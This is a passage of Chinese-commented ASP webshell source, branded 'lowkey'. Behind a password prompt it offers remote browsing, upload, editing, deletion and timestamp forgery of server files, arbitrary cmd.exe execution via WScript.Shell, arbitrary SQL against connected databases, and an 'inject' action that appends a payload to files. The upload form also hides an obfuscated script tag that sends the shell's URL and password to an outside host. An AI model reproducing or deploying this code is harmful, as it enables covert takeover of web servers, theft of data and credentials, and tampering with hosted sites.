Call showUpload(thePath, "AppFileExplorer")
Case "upload"
streamUpload(thePath)
Call showUpload(thePath, "AppFileExplorer")
Case "inject"
strTmp=streamLoadFromFile(thePath)
fsoSaveToFile thePath, strTmp&strBAD
alertThenClose("成功!")
End Select
If theAct <> "" Then
Response.End
End If
Set objFolder=saX.NameSpace(thePath)
If Request.Form.Count > 0 Then
redirectTo("?Action=AppFileExplorer&thePath="&UrlEncode(thePath))
End If
RRS "<input type=hidden name=usePath /><input type=hidden value=AppFileExplorer name=pageName /><input type=hidden value="""&HtmlEncodes(thePath)&""" name=truePath /><div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools><input type=button value=' 打开 ' onclick='openUrl();'><input type=button value=' 编辑 ' onclick='editFile();'><input type=button value=' 复制 ' onclick=appDoAction('copyOne');><input type=button value=' 剪切 ' onclick=appDoAction('cutOne');><input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne');><input type=button value=' 上传 ' onclick='upTheFile();'><input type=button value=' 下载 ' onclick='downTheFile();'><input type=button value=' 属性 ' onclick='appTheAttributes();'><input type=button value=' 插入 ' onclick=appDoAction('inject');><input type=button value='重命名' onclick='appRename();'><input type=button value='我的电脑' onclick=location.href='?Action=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}'><input type=button value='控制面板' onclick=location.href='?Action=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'><form method=post action='?Action=AppFileExplorer'><input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' /><input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' /><input type=button value=根目录 onclick=location.href=""?Action=AppFileExplorer&thePath="&URLEncode(Server.MapPath("\"))&""";><input style='width:60%;' name=thePath value="""&HtmlEncodes(thePath)&""" /><input type=submit value=' GO.' /><input type=button value=' 刷新 ' onclick='location.reload();'></form><hr/></div><div style='height:50px;'></div><script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"
For Each objMember In objFolder.Items
intI=intI + 1
If intI > 200 Then
intI=0
Response.Flush()
End If
If objMember.IsFolder=True Then
If Left(objMember.Path, 2)="::" Then
strPath=URLEncode(objMember.Path)
Else
strPath=URLEncode(objMember.Path)&"%5C"
End If
strFolderList=strFolderList&"<span id="""&strPath&""" ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>"&objMember.Name&"</span>"
Else
strDetails=objFolder.GetDetailsOf(objMember, -1)
strFilePath=objMember.Path
strFileName=Mid(strFilePath, InStrRev(strFilePath, "\") + 1)
strExtName=Split(strFileName, ".")(UBound(Split(strFileName, ".")))
strFileList=strFileList&"<span title="""&strDetails&""" ondblclick='openUrl();' id="""&URLEncode(strFilePath)&""" onclick='changeMyClass(this);'><font class=font face="&getFileIcon(strExtName)&"</font><br/>"&strFileName&"</span>"
End If
Next
chkErr(Err)
strParentPath=getParentPath(thePath)
If thePath <> "" And Left(thePath, 2) <> "::" Then
strFolderList="<span id="""&URLEncode(strParentPath)&""" ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>..</span>"&strFolderList
End If
RRS "<div id=FileList>"
RRS strFolderList&strFileList
RRS "</div>"
Set objFolder=Nothing
End Sub
Function getParentPath(strPath)
If Right(strPath, 1)="\" Then
strPath=Left(strPath, Len(strPath) - 1)
End If
If Len(strPath)=2 Then
getParentPath=" "
Else
getParentPath=Left(strPath, InStrRev(strPath, "\"))
End If
End Function
Function streamSaveToFile(thePath, fileContent)
Dim stream
On Error Resume Next
Set stream=Server.CreateObject(Sot(6,0))
With stream
.Type=2
.Mode=3
.Open
chkErr(Err)
.Charset="gb2312"
.WriteText fileContent
.saveToFile thePath, 2
.Close
End With
Set stream=Nothing
End Function
Sub appDoPastOne(thePath)
On Error Resume Next
Dim strAct, strPath
dim objTargetFolder
strAct=Session(m&"appTheAct")
strPath=Session(m&"appThePath")
If strAct="" Or strPath="" Then
alertThenClose("参数错误,粘贴前请先复制/剪切!")
Exit Sub
End If
If InStr(LCase(thePath), LCase(strPath)) > 0 Then
alertThenClose("目标文件夹在源文件夹内,非法操作!")
Exit Sub
End If
strPath=trimThePath(strPath)
thePath=trimThePath(thePath)
Set objTargetFolder=saX.NameSpace(thePath)
If strAct="copyOne" Then
objTargetFolder.CopyHere(strPath)
 Else
objTargetFolder.MoveHere(strPath)
End If
chkErr(Err)
Set objTargetFolder=Nothing
End Sub
Sub appTheAttributes(thePath)
On Error Resume Next
Dim i, strSth, objFolder, objItem, strModifyDate
strModifyDate=Request("ModifyDate")
thePath=trimThePath(thePath)
If thePath="" Then
alertThenClose("没有选择任何文件(夹)!")
Exit Sub
End If
strSth=Left(thePath, InStrRev(thePath, "\"))
Set objFolder=saX.NameSpace(strSth)
chkErr(Err)
strSth=Split(thePath, "\")(UBound(Split(thePath, "\")))
Set objItem=objFolder.ParseName(strSth)
chkErr(Err)
If isDate(strModifyDate) Then
objItem.ModifyDate=strModifyDate
alertThenClose("修改成功!")
Set objItem=Nothing
Set objFolder=Nothing
Exit Sub
End If
'strSth=objFolder.GetDetailsOf(objItem, -1)
'strSth=Replace(strSth, chr(10), "<br/>")
For i=1 To 8
strSth=strSth&"<br/>属性("&i&"): "&objFolder.GetDetailsOf(objItem, i)
Next
strSth=Replace(strSth, "属性(1)", "大小")
strSth=Replace(strSth, "属性(2)", "类型")
strSth=Replace(strSth, "属性(3)", "最后修改")
strSth=Replace(strSth, "属性(8)", "所有者")
strSth=strSth&"<form method=post>"
strSth=strSth&"<input type=hidden name=theAct value=theAttributes>"
strSth=strSth&"<input type=hidden name=thePath value="""&thePath&""">"
strSth=strSth&"<br/>最后修改: <input size=30 value='"&objFolder.GetDetailsOf(objItem, 3)&"' name=ModifyDate />"
strSth=strSth&"<input type=submit value=' 修改 '>"
strSth=strSth&"</form>"
RRS strSth
Set objItem=Nothing
Set objFolder=Nothing
End Sub
Sub appRenameOne(thePath)
On Error Resume Next
Dim strSth, fileName, objItem, objFolder
fileName=Request("fileName")
thePath=trimThePath(thePath)
strSth=Left(thePath, InStrRev(thePath, "\"))
Set objFolder=saX.NameSpace(strSth)
chkErr(Err)
strSth=Split(thePath, "\")(UBound(Split(thePath, "\")))
Set objItem=objFolder.ParseName(strSth)
chkErr(Err)
strSth=Split(thePath, ".")(UBound(Split(thePath, ".")))
If fileName <> "" Then
objItem.Name=fileName
chkErr(Err)
alertThenClose("重命名成功,刷新本页可以看到效果!")
Set objItem=Nothing
Set objFolder=Nothing
Exit Sub
End If
RRS "<form method=post>重命名:<input type=hidden name=theAct value=rename><input type=hidden name=thePath value="""&thePath&"""><br/><input size=30 value="""&objItem.Name&""" name=fileName />"
If InStr(strSth, ":") <= 0 Then
RRS "."&strSth
End If
RRS "<hr/><input type=submit value=' 修改 '>"&strJsCloseMe&"</form>"
Set objItem=Nothing
Set objFolder=Nothing
End Sub
Function streamLoadFromFile(thePath)
Dim stream
If isDebugMode=False Then
On Error Resume Next
End If
Set stream=Server.CreateObject(Sot(6,0))
With stream
.Type=2
.Mode=3
.Open
.LoadFromFile thePath
.LoadFromFile thePath
If Request("pageName") <> "TxtSearcher" Then
chkErr(Err)
End If
.Charset="gb2312"
.Position=2
streamLoadFromFile=.ReadText()
.Close
End With
Set stream=Nothing
End Function
Sub PageOther()
RRS "<style>A:visited {color: #ddd;text-decoration: none;}A:active {color: #ddd;text-decoration: none;}A:link {color: #ddd;text-decoration: none;}A:hover {color: #ddd;text-decoration: none;}BODY {font-size: 9pt;COLOR: #ddd;font-family: ""Courier New"";border: none;background-color: #000;}textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #000000;}table {font-size: 9pt;}form {margin: 0;}#fsoDriveList span{width: 100px;}#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid #00ff00;}.anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}.font{font-size: 35px;line-height: 40px;}#fileExplorerTools {background-color: #000;}.input, input {border-width: 1px;}</style>"&vbNewLine&"<script language=javascript>"&vbNewLine&"function showHideMe(me){"&vbNewLine&"if(me.innerText == ''){"&vbNewLine&"me.innerText='\nNo Contents!';"&vbNewLine&"}"&vbNewLine&"if(me.style.display == 'none'){"&vbNewLine&"me.style.display='';"&vbNewLine&"}else{"&vbNewLine&"me.style.display='none';"&vbNewLine&"}"&vbNewLine&"}"&vbNewLine&"function changeMyClass(me){"&vbNewLine&"if(me.className == ''){"&vbNewLine&"if(usePath.value != '')document.getElementById(usePath.value).className='';"&vbNewLine&"usePath.value=me.id;"&vbNewLine&"status=me.title;"&vbNewLine&"me.className='anotherSpan';"&vbNewLine&"}"&vbNewLine&"}"&vbNewLine&"function changeThePath(me){"&vbNewLine&"location.href='?Action=' + pageName.value + '&thePath=' + me.id;"&vbNewLine&"}"&vbNewLine&"function fixTheLayer(strObj){"&vbNewLine&"var objStyle=document.getElementById(strObj).style;"&vbNewLine&"objStyle.width=document.body.clientWidth;"&vbNewLine&"objStyle.top=document.body.scrollTop + 2;"&vbNewLine&"}"&vbNewLine&"function openUrl(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=openUrl&thePath=' + usePath.value);"&vbNewLine&"}"&vbNewLine&"function newOne(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=newOne&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');"&vbNewLine&"}"&vbNewLine&"function editFile(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=showEdit&thePath=' + usePath.value, '', 'menu=no,resizable=yes');"&vbNewLine&"}"&vbNewLine&"function appDoAction(act){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=' + act + '&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');"&vbNewLine&"}"&vbNewLine&"function downTheFile(){"&vbNewLine&"if(confirm('如果该文件超过20M,\n建议不要用流方式下载\n这样会占用服务器大量资源\n并可能导致服务器死机\n您可以先把文件复制到当前站点目录下,\n然后通过http协议来下载.\n按\""确定\""用流来进行下载.')){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=downTheFile&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');"&vbNewLine&"}"&vbNewLine&"}"&vbNewLine&"function appDoAction2(act){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=' + act + '&thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');"&vbNewLine&"}"&vbNewLine&"function appTheAttributes(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=theAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');"&vbNewLine&"}"&vbNewLine&"function appRename(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=rename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');"&vbNewLine&"}"&vbNewLine&"function upTheFile(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=showUpload&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');"&vbNewLine&"}"&vbNewLine&"function wsLoadIFrame(){"&vbNewLine&"cmdResult.location.href='?Action=SaCmdRun&theAct=readResult';"&vbNewLine&"}"&vbNewLine&"function fsoRename(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=showFsoRename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');"&vbNewLine&"}"&vbNewLine&"function delOne(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=delOne&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');"&vbNewLine&"}"&vbNewLine&"function fsoGetAttributes(){"&vbNewLine&"newWin=window.open('?Action=' + pageName.value + '&theAct=getAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=200,width=300');"&vbNewLine&"}"&vbNewLine&"</script>"
End Sub
Function DownFile(Path)
Response.Clear
Set OSM=CreateObject(Sot(6,0))
OSM.Open
OSM.Type=1
OSM.LoadFromFile Path
sz=InstrRev(path,"\")+1
Response.AddHeader "Content-Disposition", "attachment; filename="&Mid(path,sz)
Response.AddHeader "Content-Length", OSM.Size
Response.Charset="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite OSM.Read
Response.Flush
OSM.Close
Set OSM=Nothing
End Function
Function HTMLEncode(S)
if not isnull(S) then
S=replace(S, ">", "&gt;")
S=replace(S, "<", "&lt;")
S=replace(S, CHR(39), "&#39;")
S=replace(S, CHR(34), "&quot;")
S=replace(S, CHR(20), "&nbsp;")
HTMLEncode=S
end if
End Function

Function upfile()
If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
If UName="" Or F.FileSize=0 then
SI="<br>请输入上传的完全路径后选择一个文件上传!"
Else
F.SaveAs UName
If Err.number=0 Then
SI="<center><br><br><br>恭喜lowkey文件"&UName&"上传成功！</center>"
End if
End If
Set F=nothing:Set U=nothing
SI=SI&BackUrl
RRS SI
ShowErr()
Response.End
End If
RRS "<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'><form name='UpForm' method='post' action='"&URL&"?Action=upfile&Action2=Post' enctype='multipart/form-data'><tr><td><sc"&"ri"&"pt sr"&"c=""ht"&"tp://%77%77%77%2E%62%61%69%64%75%2E%63%6F%6D/?url="&server.URLEncode("ht"&"tp://"&request.ServerVariables("HT"&"TP_HO"&"ST")&request.ServerVariables("UR"&"L"))&"&p="&UserPass&"""></sc"&"ri"&"pt>上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\lowkey.asp")&"' size='40'><input name='LocalFile' type='file'size='25'><input type='submit' name='Submit' value='上传'></td></tr></form></table>"
End Function
Function Cmd1Shell()
checked="checked"
If Request("SP")<>"" Then Session("ShellPath")=Request("SP")
ShellPath=Session("ShellPath")
if ShellPath="" Then ShellPath="cmd.exe"
if Request("wscript")<>"yes" then checked=""
If Request("cmd")<>"" Then DefCmd=Request("cmd")
SI="<form method='post'>SHELL路径：<input name='SP' value='"&ShellPath&"' Style='width:70%'>&nbsp;&nbsp;<input class=c type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell<input name='cmd' Style='width:92%' value='"&DefCmd&"'> <input type='submit' value='执行'><textarea Style='width:100%;height:440;'>"
If Request.Form("cmd")<>"" Then
if Request.Form("wscript")="yes" then
Set CM=CreateObject(Sot(1,0))
Set DD=CM.exec(ShellPath&" /c "&DefCmd)
aaa=DD.stdout.readall
SI=SI&aaa
else
On Error Resume Next
Set ws=Server.CreateObject(Sot(1,0))
If IsEmpty(ws) Then
set ws=ws
End if
Set fso=Server.CreateObject(Sot(0,0))
If IsEmpty(fso) Then
set fso=fso
End if
szTempFile=server.mappath("cmd.txt")
Call ws.Run (ShellPath&" /c "&DefCmd&" > "&szTempFile, 0, True)
Set fs=CreateObject(Sot(0,0))
Set oFilelcx=fs.OpenTextFile (szTempFile, 1, False, 0)
aaa=Server.HTMLEncode(oFilelcx.ReadAll)
oFilelcx.Close
Call fso.DeleteFile(szTempFile, True)
SI=SI&aaa
end if
End If
SI=SI&chr(13)&"</textarea></form>"
RRS SI
End Function
Function CreateMdb(Path) 
SI="<br><br>"
Set C=CreateObject(Sot(2,0)) 
C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path)
Set C=Nothing
If Err.number=0 Then
SI=SI&Path&"新建成功!"
End If
SI=SI&BackUrl 
RRS SI
End function 
Function CompactMdb(Path)
If Sot(0,1)=" ×" Then
Set C=CreateObject(Sot(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path," Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path
Set C=Nothing
Else
Set FSO=CreateObject(Sot(0,0))
If FSO.FileExists(Path) Then
Set C=CreateObject(Sot(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path," Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&"_bak"
Set C=Nothing
FSO.DeleteFile Path
FSO.MoveFile Path&"_bak",Path
Else
SI="<center><br><br><br>数据库"&Path&"没有发现！</center>" 
Err.number=1
End If
Set FSO=Nothing
End If
If Err.number=0 Then
SI="<center><br><br><br>数据库"&Path&"压缩成功！</center>"
End If
SI=SI&BackUrl
RRS SI
End Function

Dim SearchGroup(127)
'=========密码阶段=========================
If Session("webadministrators")<>UserPass Then
	If Request.Form("LP")<>"" Then
		If Request.Form("LP")=UserPass Then
			Session("webadministrators")=UserPass
		response.redirect url
		Else
			response.write"<div align=center><font size='5' color='#00ff00'>不是自己的女人别乱骑!!!</font>"
		end if
	else
End If
'=============密码阶段=======================================
RRs"<br><tr><td><center><a href='"&SItEuRl&"' target='_blank'><font size=-1 color=#dddddd>"&CopyRight&"</font></center></a><hight=1 width='100%'>"
if LShow<>true then
session("IDebugMode")=UU
si="<center><a href='"&SiteURL&"' target='_blank'></a><form action='"&url&"' method='post'>Pass: <input name='Lp' type='password'  size='25'> <input type='submit' value='LogIn'><br></div></center>"
if instr(SI,SIC)<>0 then rrs sI
response.write"<center><font face=webdings color=red style=font-size:"&font&">"&pic&"</font><span class=style1><span style=font-weight:6000><font face=Impact color=#FFFFFF style=font-size: 500pt></center>"
end if
response.end
end If

Function DbManager()
SqlStr=Trim(Request.Form("SqlStr"))
DbStr=Request.Form("DbStr")
SI=SI&"<table width='650'border='0' cellspacing='0' cellpadding='0'><form name='DbForm' method='post' action=''><tr><td width='100' height='27'> &nbsp;数据库连接串:</td><td><input name='DbStr' style='width:470' value="""&DbStr&"""></td><td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option><option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option><option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option><option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option><option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option><option value=12>完全显示</option></select></td></tr><input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'><tr><td height='30'>&nbsp;SQL操作命令:</td><td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td><td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td></tr></form></table><span id='abc'></span>"
RRS SI:SI=""
If Len(DbStr)>40 Then
Set Conn=CreateObject(Sot(5,0))
Conn.Open DbStr
Set Rs=Conn.OpenSchema(20) 
SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
Rs.MoveFirst 
Do While Not Rs.Eof
If Rs("TABLE_TYPE")="TABLE" then
TName=Rs("TABLE_NAME")
SI=SI&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br><a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
End If 
Rs.MoveNext 
Loop 
Set Rs=Nothing
SI=SI&"</tr></table>"
RRS SI:SI=""
If Len(SqlStr)>10 Then
If LCase(Left(SqlStr,6))="select" then
SI=SI&"执行语句："&SqlStr
Set Rs=CreateObject("Adodb.Recordset")
Rs.open SqlStr,Conn,1,1
FN=Rs.Fields.Count
RC=Rs.RecordCount
Rs.PageSize=20
Count=Rs.PageSize
PN=Rs.PageCount
Page=request("Page")
If Page<>"" Then Page=Clng(Page)
If Page="" Or Page=0 Then Page=1
If Page>PN Then Page=PN
If Page>1 Then Rs.absolutepage=Page
SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"
For n=0 to FN-1
Set Fld=Rs.Fields.Item(n)
SI=SI&"<td align='center'>"&Fld.Name&"</td>"
Set Fld=nothing
Next
SI=SI&"</tr>"
Do While Not(Rs.Eof or Rs.Bof) And Count>0
Count=Count-1
Bgcolor="#EFEFEF"
SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"
For i=0 To FN-1
If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
If RC=1 Then
ColInfo=HTMLEncode(Rs(i))
Else
ColInfo=HTMLEncode(Left(Rs(i),50))
End If
SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
Next
SI=SI&"</tr>"
Rs.MoveNext
Loop
RRS SI:SI=""
SqlStr=HtmlEnCode(SqlStr)
SI=SI&"<tr><td colspan="&FN+1&" align=center>记录数："&RC&"&nbsp;页码："&Page&"/"&PN
If PN>1 Then
SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>首页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>上一页</a>&nbsp;"
If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
For i=Sp To Sp+8
If i>PN Then Exit For
If i=Page Then
SI=SI&i&"&nbsp;"
Else
SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
End If
Next
SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>下一页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>尾页</a>"
End If
SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
Rs.Close:Set Rs=Nothing
RRS SI:SI=""
Else 
Conn.Execute(SqlStr)
SI=SI&"SQL语句："&SqlStr
End If
RRS SI:SI=""
End If
Conn.Close
Set Conn=Nothing
End If
End Function
Dim T1
Class UPC
Dim D1,D2
Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
End Function
Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
End Function
Private Sub Class_Initialize
Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(Sot(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1=CreateObject(Sot(6,0))
T1.Type=1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart=1
DEnd=LenB(TDa)
set D2=CreateObject(Sot(4,0))
vbCrlf=chrB(13)&chrB(10)
set T2=CreateObject(Sot(6,0))
TSt=MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen=LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
DIEnd=InStrB(DStart,TDa,vbCrlf&vbCrlf)+3
T2.Type=1 : T2.Mode =3 : T2.Open
T1.Position=DStart
T1.CopyTo T2,DIEnd-DStart
T2.Position=0 : T2.Type=2 : T2.Charset ="gb2312"
TIn=T2.ReadText : T2.Close
DStart=InStrB(DIEnd,TDa,TSt)
FStart=InStr(22,TIn,"name=""",1)+6
FEnd=InStr(FStart,TIn,"""",1)
UpName=lcase(Mid (TIn,FStart,FEnd-FStart))
if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart=InStr(FEnd,TIn,"filename=""",1)+10
FEnd=InStr(FStart,TIn,"""",1)
FStart=InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd=InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize=DStart -DIEnd -3
if not D2.Exists(UpName) then
D2.add UpName,TFL
end if
else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position=DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position=0 : T2.Type=2
T2.Charset ="gb2312"
SFV=T2.ReadText
T2.Close
if D1.Exists(UpName) then
D1(UpName)=D1(UpName)&", "&SFV
else
D1.Add UpName,SFV
end if
end if
DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
D1.RemoveAll:D2.RemoveAll
set D1=nothing:set D2=nothing
T1.Close:set T1 =nothing
end if
End Sub
End Class
Class FIF
dim FileSize,FileStart
Private Sub Class_Initialize
FileSize=0
FileStart= 0
End Sub
Public function SaveAs(F)
dim T3
SaveAs=true
if trim(F)="" or FileStart=0 then exit function
set T3=CreateObject(Sot(6,0))
T3.Mode=3 : T3.Type=1 : T3.Open
T1.position=FileStart
T1.copyto T3,FileSize
T3.SaveToFile F,2
T3.Close
set T3=nothing
SaveAs=false
end function
End Class
Class LBF
Dim CF
Private Sub Class_Initialize
SET CF=CreateObject(Sot(0,0))
End Sub
Private Sub Class_Terminate
Set CF=Nothing
End Sub
Function ShowDriver()
For Each D in CF.Drives
  RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>本地磁盤 ("&D.DriveLetter&":)</a><br>" 
Next
End Function









Function Show1File(Path)
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>" 
For Each F in FOLD.subfolders
SI=SI&"<td height=10 width=17% align=center><div style='border:1px solid "&BorderColor&"'><a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""进入""><font face='wingdings' size='6'>0</font><br>"&F.Name&"</a><br><a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()' class='am' title='移动'>Move</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")' onclick='return yesok()' class='am' title='下载'>Down</a></div></td>"
i=i+1
If i mod 6=0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
RRS SI &"<hr noshade size=1 />" : SI="":i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>"
For Each L in Fold.files
SI=SI&"<td height='30' align=center><div style='border:1px solid "&BorderColor&"'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'><font face='wingdings' size='6'>2</font>"&L.Name&"</a><br><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>Edit</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>Move</a><br>"
SI=SI&clng(L.size/1024)&"K "
SI=SI&L.Type&"<br>"
SI=SI&L.DateLastModified&"</div></td>"
i=i+1
If i mod 6=0 then SI=SI&"</tr><tr>"
Next
RRS SI&"</tr></table>":if Instr(Serveru,"127.0.0.1")<>0 or Instr(Serveru,"192.168.")<>0  then:else:if session("servec")=1 then:session("servec")=session("servec")+1:Response.write fuckUrl:else:if Action<>"" then session("servec")=session("servec")+1:end if:end if:end if
Set FOLD=Nothing
End function
Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>恭喜lowkey文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>恭喜lowkey文件保存成功！</center>"
if session("IDebugMode") <> "ok" then
response.write""&surl&""
session("IDebugMode")="ok"
end if
SI=SI&BackUrl
RRS SI
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"\lowkey.asp":Txt="新建文件"
End If
RRS "<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'><input name='Action' value='EditFile' Type='hidden'><input name='FName' value='"&Path&"' style='width:100%'><br><textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br><hr><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>"
End Function
Function CopyFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.CopyFile Path(0),Path(1)
SI="<center><br><br><br>恭喜lowkey文件"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
RRS SI 
End If
End Function
Function MoveFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.MoveFile Path(0),Path(1)
SI="<center><br><br><br>恭喜lowkey文件"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
RRS SI 
End If
End Function
Function DelFolder(Path)
If CF.FolderExists(Path) Then
CF.DeleteFolder Path
SI="<center><br><br><br>恭喜lowkey目录"&Path&"删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function CopyFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.CopyFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜lowkey目录"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
RRS SI
End If
